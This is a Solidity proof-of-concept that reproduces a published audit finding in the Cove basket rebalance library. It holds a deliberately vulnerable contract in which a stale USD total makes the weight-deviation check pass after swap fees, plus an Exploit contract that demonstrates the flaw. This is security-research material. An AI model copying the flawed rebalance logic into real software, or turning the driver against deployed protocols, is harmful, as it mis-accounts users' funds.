// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Cove finding 57953 (H-01):
// "Incorrect basket USD value will cause incorrect results".
//
// Real audited source (the vulnerable rebalance sequence + the fee-charging block
// + the deviation check are reproduced VERBATIM from the embedded snippets of the
// audit report; the vulnerable omission is marked @>):
//   protocol Cove (Storm Labs) — BasketManagerUtils rebalance library
//   fns    proposeRebalance / _initializeBasketData / _processInternalTrades /
//          _validateExternalTrades / _isTargetWeightMet
//   report github.com/pashov/audits/blob/master/team/md/Cove-security-review_2024-12-30.md  (H-01, id 57953)
//
// Root cause: `totalValues` (the total USD value of each basket) is populated by
// `_initializeBasketData()` BEFORE `_processInternalTrades()` runs. The internal
// trades charge a swap fee (the verbatim `info.feeOnSell` / `info.feeOnBuy`
// blocks), which lowers the actual USD value held by the affected baskets. But
// `_processInternalTrades()` is called WITHOUT the `totalValues` array (the @>
// line) and never decrements it. `_isTargetWeightMet()` then divides each asset's
// (post-fee) value by the STALE, too-high `totalValues[i]`, understating every
// weight. A rebalance whose post-fee weights actually breach `_MAX_WEIGHT_DEVIATION`
// therefore passes the check as if the target weights were met.
//
// Harm (silent accounting): with the stale denominator `_isTargetWeightMet`
// returns TRUE (rebalance accepted); with a fee-corrected denominator it returns
// FALSE (should be rejected) — SAME post-trade balances, only the denominator
// differs. There is no positive transfer to an attacker, so the magnitude of the
// unaccounted USD (the total swap fees `totalValues` failed to subtract) is minted
// to SINK 0x000000000000000000000000000000000000D00d on a DRIFT marker token.
//
// Faithful minimal doubles: real ERC20 assets custodied by the manager with a
// real per-basket ledger (token-conserving), a $1 (1e18) price oracle, and
// `FixedPointMathLib.fullMulDiv` / `MathUtils.diff` matching the audited calls.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful reproduction of the audited `FixedPointMathLib.fullMulDiv`
///      result (floor(x*y/d); all values here are in-range so a 256-bit product
///      is exact, matching the library's full-precision output).
library FixedPointMathLib {
    function fullMulDiv(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return x * y / d;
    }
}

/// @dev Faithful reproduction of the audited `MathUtils.diff` (absolute diff).
library MathUtils {
    function diff(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a - b : b - a;
    }
}

/// @dev Faithful minimal ERC20 double for the basket assets and the marker token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the rebalance sequence, the internal-trade fee block, and
// the deviation check are reproduced VERBATIM from the audited BasketManagerUtils.
// ─────────────────────────────────────────────────────────────────────────────
contract BasketManagerUtils {
    // Faithful audited constants.
    uint256 internal constant _WEIGHT_PRECISION = 1e18;
    uint256 internal constant _MAX_WEIGHT_DEVIATION = 0.05e18; // 5%

    // `swapFee` is applied as `swapFee / 20_000` (the audited denominator).
    uint256 public swapFee;
    mapping(address => uint256) public collectedSwapFees;

    // Basket asset universe + $1 price oracle double.
    address[] public assets;
    mapping(address => uint256) public price; // asset => USD price (1e18 == $1)

    // Real per-basket custody ledger (manager holds the tokens; sum(ledger)+fees
    // == manager's real token balance, so accounting is token-conserving).
    mapping(address => mapping(address => uint256)) public ledger;

    // Proposed target weights for `fromBasket`, aligned with `assets`.
    uint256[] public proposedTargetWeights;
    address public fromBasket;
    address public toBasket;

    // Audited `InternalTrade` (faithful subset of fields used by the fee block).
    struct InternalTrade {
        address fromBasket;
        address sellToken;
        address buyToken;
        address toBasket;
        uint256 sellAmount;
        uint256 buyAmount;
    }

    // Audited scratch struct used to hold per-trade fee amounts.
    struct Info {
        uint256 feeOnSell;
        uint256 feeOnBuy;
    }

    event SwapFeeCharged(address indexed token, uint256 fee);

    error TargetWeightsNotMet();

    function init(
        address[] calldata assets_,
        uint256[] calldata prices_,
        uint256[] calldata targets_,
        uint256 swapFee_,
        address fromBasket_,
        address toBasket_
    ) external {
        for (uint256 i = 0; i < assets_.length; i++) {
            assets.push(assets_[i]);
            price[assets_[i]] = prices_[i];
            proposedTargetWeights.push(targets_[i]);
        }
        swapFee = swapFee_;
        fromBasket = fromBasket_;
        toBasket = toBasket_;
    }

    /// @notice Fund a basket: pull real tokens into custody and credit the ledger.
    function deposit(address basket, address token, uint256 amount) external {
        MiniToken(token).transferFrom(msg.sender, address(this), amount);
        ledger[basket][token] += amount;
    }

    // ── faithful double: read the basket's per-asset balances + total USD value ──
    /// @dev Reproduces `_initializeBasketData`: populates `totalValue` (the stale
    ///      USD value used later by `_isTargetWeightMet`).
    function _initializeBasketData(address basket)
        internal
        view
        returns (uint256[] memory basketBalances, uint256 totalValue)
    {
        basketBalances = new uint256[](assets.length);
        for (uint256 i = 0; i < assets.length; i++) {
            basketBalances[i] = ledger[basket][assets[i]];
            totalValue += FixedPointMathLib.fullMulDiv(basketBalances[i], price[assets[i]], 1e18);
        }
    }

    /// @notice Reproduces `_processInternalTrades`. The swap-fee blocks below are
    ///         VERBATIM from the audited source. The trade executes against the
    ///         real ledger and skims the fees to `collectedSwapFees`, lowering the
    ///         baskets' actual USD value. Returns the total fees and the USD value
    ///         `fromBasket` lost, so a caller COULD keep `totalValues` in sync —
    ///         the vulnerable caller does not.
    function _processInternalTrades(InternalTrade memory trade, uint256[] memory basketBalances)
        internal
        returns (uint256 totalFees, uint256 fromBasketDrift)
    {
        Info memory info;
        uint256 initialBuyAmount = trade.buyAmount;

        if (swapFee > 0) {
            info.feeOnSell = FixedPointMathLib.fullMulDiv(trade.sellAmount, swapFee, 20_000);
            collectedSwapFees[trade.sellToken] += info.feeOnSell;
            emit SwapFeeCharged(trade.sellToken, info.feeOnSell);
        }
        if (swapFee > 0) {
            info.feeOnBuy = FixedPointMathLib.fullMulDiv(initialBuyAmount, swapFee, 20_000);
            collectedSwapFees[trade.buyToken] += info.feeOnBuy;
            emit SwapFeeCharged(trade.buyToken, info.feeOnBuy);
        }

        // Real ledger settlement of the internal trade (fees skimmed to protocol):
        //   fromBasket sells sellToken, receives buyToken minus feeOnBuy;
        //   toBasket   sells buyToken,  receives sellToken minus feeOnSell.
        ledger[trade.fromBasket][trade.sellToken] -= trade.sellAmount;
        ledger[trade.toBasket][trade.sellToken] += trade.sellAmount - info.feeOnSell;
        ledger[trade.fromBasket][trade.buyToken] += trade.buyAmount - info.feeOnBuy;
        ledger[trade.toBasket][trade.buyToken] -= trade.buyAmount;

        // Keep the in-memory fromBasket balances in sync with the trade (as the
        // audited helper does) so the deviation check sees post-trade holdings.
        for (uint256 i = 0; i < assets.length; i++) {
            if (assets[i] == trade.sellToken) basketBalances[i] -= trade.sellAmount;
            if (assets[i] == trade.buyToken) basketBalances[i] += trade.buyAmount - info.feeOnBuy;
        }

        totalFees = info.feeOnSell + info.feeOnBuy;
        // USD value fromBasket lost = sold value - received value = feeOnBuy (price $1).
        fromBasketDrift = FixedPointMathLib.fullMulDiv(info.feeOnBuy, price[trade.buyToken], 1e18);
    }

    // ── faithful no-op: no external trades in this reproduction ──
    function _validateExternalTrades() internal pure {}

    /// @notice Reproduces `_isTargetWeightMet`. The `assetValueInUSD` /
    ///         `afterTradeWeight` / deviation branch is VERBATIM from the audited
    ///         source. `totalValue` is the denominator supplied by the caller.
    function _isTargetWeightMet(uint256[] memory basketBalances, uint256 totalValue)
        internal
        view
        returns (bool)
    {
        for (uint256 j = 0; j < basketBalances.length; j++) {
            uint256 assetValueInUSD = FixedPointMathLib.fullMulDiv(basketBalances[j], price[assets[j]], 1e18);
            uint256 afterTradeWeight = FixedPointMathLib.fullMulDiv(assetValueInUSD, _WEIGHT_PRECISION, totalValue);
            if (MathUtils.diff(proposedTargetWeights[j], afterTradeWeight) > _MAX_WEIGHT_DEVIATION) {
                return false;
            }
        }
        return true;
    }

    /// @notice Reproduces the audited `proposeRebalance` sequence. The verbatim
    ///         call order (finding snippet) is:
    ///
    ///           uint256[] memory totalValues = new uint256[](numBaskets);
    ///           _initializeBasketData(self, baskets, basketAssets, basketBalances, totalValues);
    ///           _processInternalTrades(self, internalTrades, baskets, basketBalances);
    ///           _validateExternalTrades(self, externalTrades, baskets, totalValues, basketBalances);
    ///           if (!_isTargetWeightMet(self, baskets, basketTargetWeights, basketAssets, basketBalances, totalValues)) {
    ///                   revert TargetWeightsNotMet();
    ///           }
    ///
    /// Returns both the vulnerable result (stale denominator) and the corrected
    /// result (fee-adjusted denominator) to make the divergence observable.
    function proposeRebalance(InternalTrade memory trade)
        external
        returns (bool metStale, bool metCorrected, uint256 totalFees, uint256 basketDrift)
    {
        // totalValues (USD value per basket) is populated here, BEFORE the trades.
        (uint256[] memory basketBalances, uint256 totalValue) = _initializeBasketData(trade.fromBasket);

        // NOTE: for rebalance retries the internal trades must be updated as well
        (totalFees, basketDrift) = _processInternalTrades(trade, basketBalances); // @> VULN: totalValues is NOT passed/updated here — the swap fees charged inside lower the basket's USD value, but the stale `totalValue` denominator is reused by _isTargetWeightMet below
        _validateExternalTrades();

        // Vulnerable check: divides post-fee balances by the STALE totalValue.
        metStale = _isTargetWeightMet(basketBalances, totalValue);
        // Corrected check: same balances, denominator reduced by the fees charged.
        metCorrected = _isTargetWeightMet(basketBalances, totalValue - basketDrift);

        if (!metStale) revert TargetWeightsNotMet(); // does NOT revert: stale check wrongly reports "met"
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: run a rebalance whose post-fee weights breach the deviation
// bound, and prove the stale-denominator check accepts it while the fee-corrected
// check rejects it. The unaccounted USD (total swap fees) is minted to SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant FROM_BASKET = address(0xB001);
    address internal constant TO_BASKET = address(0xB002);

    MiniToken public tokenA;
    MiniToken public tokenB;
    MiniToken public tokenC;
    MiniToken public marker;
    BasketManagerUtils public mgr;

    bool public metStale;
    bool public metCorrected;
    uint256 public totalFees;
    uint256 public basketDrift;
    uint256 public sinkDrift; // harm magnitude minted to SINK

    constructor() {
        tokenA = new MiniToken("Cove Basket Asset A", "cbA"); // child nonce 1
        tokenB = new MiniToken("Cove Basket Asset B", "cbB"); // child nonce 2
        tokenC = new MiniToken("Cove Basket Asset C", "cbC"); // child nonce 3
        marker = new MiniToken("Unaccounted USD Drift", "DRIFT"); // child nonce 4 (marker/profit token)
        mgr = new BasketManagerUtils(); // child nonce 5 (VULN)

        address[] memory assets = new address[](3);
        assets[0] = address(tokenA);
        assets[1] = address(tokenB);
        assets[2] = address(tokenC);

        uint256[] memory prices = new uint256[](3);
        prices[0] = 1e18;
        prices[1] = 1e18;
        prices[2] = 1e18;

        // Target weights (sum 1e18): A 50%, B 25%, C 25%.
        uint256[] memory targets = new uint256[](3);
        targets[0] = 0.5e18;
        targets[1] = 0.25e18;
        targets[2] = 0.25e18;

        // swapFee = 100 -> 100/20_000 = 0.5% per leg (realistic protocol fee).
        mgr.init(assets, prices, targets, 100, FROM_BASKET, TO_BASKET);

        // Fund fromBasket: A=5500, B=3000, C=1500 (total $10,000).
        _fund(FROM_BASKET, tokenA, 5500e18);
        _fund(FROM_BASKET, tokenB, 3000e18);
        _fund(FROM_BASKET, tokenC, 1500e18);
        // Fund toBasket with the C it will sell into the internal trade.
        _fund(TO_BASKET, tokenC, 1000e18);
    }

    function _fund(address basket, MiniToken token, uint256 amount) internal {
        token.mint(address(this), amount);
        token.approve(address(mgr), type(uint256).max);
        mgr.deposit(basket, address(token), amount);
    }

    function run() external {
        // Internal trade: fromBasket sells 1000 B, buys 1000 C. Fees (0.5% per
        // leg) skim 5 B + 5 C to the protocol, lowering both baskets' USD value.
        BasketManagerUtils.InternalTrade memory trade = BasketManagerUtils.InternalTrade({
            fromBasket: FROM_BASKET,
            sellToken: address(tokenB),
            buyToken: address(tokenC),
            toBasket: TO_BASKET,
            sellAmount: 1000e18,
            buyAmount: 1000e18
        });

        (metStale, metCorrected, totalFees, basketDrift) = mgr.proposeRebalance(trade);

        // harm: the stale-denominator deviation check accepts a rebalance whose
        // fee-corrected weights actually breach _MAX_WEIGHT_DEVIATION.
        require(metStale, "stale check should (wrongly) report target weights met");
        require(!metCorrected, "fee-corrected check should report weights NOT met");

        // Mint the unaccounted USD (total swap fees never subtracted from the
        // totalValues array) to SINK as the quantified accounting drift.
        sinkDrift = totalFees;
        marker.mint(SINK, totalFees);

        require(totalFees == 10e18, "unexpected fee magnitude");
        require(marker.balanceOf(SINK) == totalFees && totalFees > 0, "no drift recorded at sink");
    }
}
